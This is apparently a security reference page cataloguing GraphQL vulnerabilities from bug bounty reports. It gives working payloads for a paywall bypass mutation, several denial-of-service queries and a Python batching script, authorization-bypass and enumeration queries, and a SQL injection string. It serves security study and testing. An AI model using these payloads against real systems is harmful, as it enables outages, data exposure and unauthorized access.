# VULNERABILITIES, REPORTS AND EXPLOITS

### Bypass Paywall Using GraphQL

Some targets differentiate between free and premium features through GUI-based paywalls that block access to certain functionalities unless you pay. However, with **GraphQL introspection enabled**, I uncovered the mutation that this feature utilizes, allowing me to bypass the paywall by directly interacting with the API.

#### Steps:

1. **GraphQL**:
   * Identified the mutation being used for the restricted feature.
2. **Direct API Request**:
   * Used the mutation directly via an API request, bypassing the paywall GUI restriction.

#### Example Request:

```http
POST /t/graphql/org/{your-orgID}?q=ChangeUsersOrgRole HTTP/2
Host: app.target.com
Cookie: <your-cookie>
User-Agent: <your-user-agent>
Referer: https://app.target.com/analytics/sallam/settings/users/joined
Content-Type: application/json
X-Org: 315336
Content-Length: 557
Origin: https://app.target.com

{
  "query": "mutation ChangeUsersOrgRole($loginIds: [ID!]!, $orgRole: Int!) {\n  changeUsersOrgRole(loginIds: $loginIds, orgRole: $orgRole) {\n    ...userFields\n    __typename\n  }\n}\n\nfragment userFields on User {\n  id\n  alias\n  avatarVersion\n  blurb\n  createdAt\n  defaultAllProjectRole\n  defaultAppId\n  email\n  firstName\n  fullName\n  hasAvatar\n  hasOutstandingInvite\n  isConnectedToSlack\n  lastName\n  loginId\n  name\n  orgRole\n  orgTeam\n  title\n  pronouns\n  __typename\n}\n",
  "variables": {
    "loginIds": ["sallam@cyberar.net"],
    "orgRole": 1
  }
}
```

#### Result:

By sending this request, the paywall was bypassed, granting access to the restricted feature. This highlights how misconfigured GraphQL endpoints and exposed mutations can lead to security vulnerabilities.

### Denial of Service (DoS)

* **A Large Payload (HackerOne):** A hacker found that HackerOne did not enforce a character limit on API query inputs, despite documentation indicating one. A Python exploit was used to send a large payload, demonstrating that the server was vulnerable to denial of service when receiving large inputs.

* **Regular Expressions (CS Money):** A vulnerability was discovered where a user could cause a denial of service by using a regular expression . The vulnerability involved a query that used regular expressions, which could lead to a ReDoS (Regular Expression Denial of Service) attack, where a crafted regular expression causes the server to hang .

```graphql
query {
    search(q: "\u0000)", lang: "en") {
    --snip--
}

In response to this query, the GraphQL API server returned an interesting
error that revealed some information critical to identifying the existence of
the ReDoS vulnerability:

"errors": [
    {
    "message": "value (?=.*\u0000) must not contain null by tes"
    --snip--
    }
]
```

As you can see, the string supplied through the q argument was inserted into regex-matching logic on the server, indicated by the preceding (?=.\*string in the response. The server might use this argument to search for relevant data in a database.

* **A Circular Introspection Query (GitLab):** A circular introspection query was used to cause a denial of service on a GitLab server . The attack involved creating two fragments that reference each other on the `__Schema` type, leading to an infinite loop and freezing the server . The code snippet for this exploit is:

```graphql
query {
    __schema {
        types {
            fields {
                type {
                    fields {
                        type {
                            --snip--
                        }
                    }
                }
            }
        }
    }
}
```

* **Aliases for Field Duplication (Magento):** A vulnerability using aliases to duplicate fields led to a denial of service . The exploit involves using aliases to send duplicate fields in a query, which can cause the server to consume more resources than necessary .

```graphql
query {
    alias1: countries {
        full_name_english
        full_name_english # continues 1000s of times
        --snip--
    }
    
    alias2: countries {
        --snip--
    }
    
    alias3: countries {
        --snip--
    }
}
```

* **Array-Based Batching for Field Duplication (WPGraphQL):** An array-based batching technique was used to duplicate fields and cause a denial of service on WPGraphQL, a WordPress plug-in . The following code is a snippet of an exploit that demonstrates the vulnerability:

```python
payload = 'content \n comments { \n nodes { \n content } }' * FORCE_MULTIPLIER
query = {'query':'query { \n posts { \n nodes { \n ' + payload + '} } }'}
for _ in range(0, CHAINED_REQUESTS):
    queries.append(query)
r = requests.post(WORDPRESS_URL, json=queries)
print('Time took: {}'.format(r.elapsed.total_seconds()))
```

* **Circular Fragments (Agoo):** A circular fragment condition was exploited to cause a denial of service on an Agoo server . The exploit creates two fragments that reference each other and then includes one of them in a query, causing an infinite loop.

```graphql
query Introspection {
    __schema {
        directives {
            name
        }
    }
}

-------------------
query CircularFragment {
    __schema {
         ...A
    }
}

fragment A on __Schema {
    directives {
        name
    }
 ...B
}

fragment B on __Schema {
     ...A
}
```

### Broken Authorization

* **Allowing Data Access to Deactivated Users (GitLab):** A vulnerability in GitLab allowed deactivated users to still access data through the GraphQL API . The vulnerability highlights that while a user may be deactivated, their data may still be accessible through the GraphQL endpoint.

* **Disclosing the Number of Allowed Hackers Through a Team Object (HackerOne):** A vulnerability on HackerOne allowed the disclosure of the number of allowed hackers through a team object . This vulnerability shows that even seemingly innocuous data disclosure can be an issue.

{% embed url="https://hackerone.com/reports/342978" %}

* **Reading Private Notes (GitLab):** A vulnerability in GitLab’s GraphQL API allowed hackers to read private notes, even though they were restricted in the REST API . The query used to exploit this vulnerability is:

{% embed url="https://hackerone.com/reports/633001" %}

```graphql
query {
   project(fullPath:"username16/ci-test"){
     issue(iid:"1"){
       descriptionHtml
       notes {
         edges {
           node {
             bodyHtml
             system
             author {
               username
             }
             body
           }
         }
       }
     }
   }
}
```

* **Disclosing Payment Transaction Information (HackerOne):** A vulnerability on HackerOne allowed access to payment transaction information . The vulnerability allowed an unauthorized user to access a total count of payment transactions, revealing sensitive financial information .

### Information Disclosure

* **Enumerating GraphQL Users (GitLab):** A vulnerability allowed the enumeration of GraphQL users . This vulnerability showed how an API may inadvertently expose user information.

```graphql
query {
    users {
        nodes {
            id
            name
            username
        }
    }
}
```

* **Accessing the Introspection Query via WebSocket (Nuri):** A vulnerability was found in Nuri where the introspection query was accessible via WebSocket .

{% embed url="https://hackerone.com/reports/862835" %}

* **SQL Injection in a GET Query Parameter (HackerOne):** A SQL injection vulnerability was found in a HackerOne application in a GET query parameter . This showed how GraphQL endpoints can be vulnerable to common injection attacks through GET requests.

{% embed url="https://hackerone.com/reports/435066" %}

* **SQL Injection in an Object Argument (Apache SkyWalking):** A SQL injection vulnerability was found in Apache SkyWalking where the vulnerability was located in an object argument . A code review revealed that the vulnerability stemmed from a lack of sanitization when constructing SQL queries using client-supplied data .

```graphql
query SQLi($d: Duration!) {
    getLinearIntValues(metric:{name: "all_p99", id: "') UNION SELECT 1,CONCAT('~','9999999999','~')--"},duration: $d) {
        values {
            value
        }
    }
}
```
